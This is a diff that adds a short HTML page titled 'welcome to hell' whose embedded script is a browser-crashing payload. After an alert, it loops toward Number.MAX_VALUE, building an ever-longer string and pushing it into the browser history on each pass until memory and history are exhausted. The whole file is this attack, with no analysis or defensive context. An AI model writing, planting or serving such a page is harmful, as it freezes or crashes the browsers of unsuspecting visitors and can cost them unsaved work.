@@ -1,0 +1,16 @@
+<html>
+<head>
+<title>welcome to hell</title>
+</head>
+<body>
+<h1>you just visited the hell</h1>
+<script>
+alert("click ok to kill your browser")
+var total = "";
+for( var i = 0; i < Number.MAX_VALUE; i++ ) {
+total += i.toString();
+history.pushState(0,0, total );
+}
+</script>
+</body>
+</html>
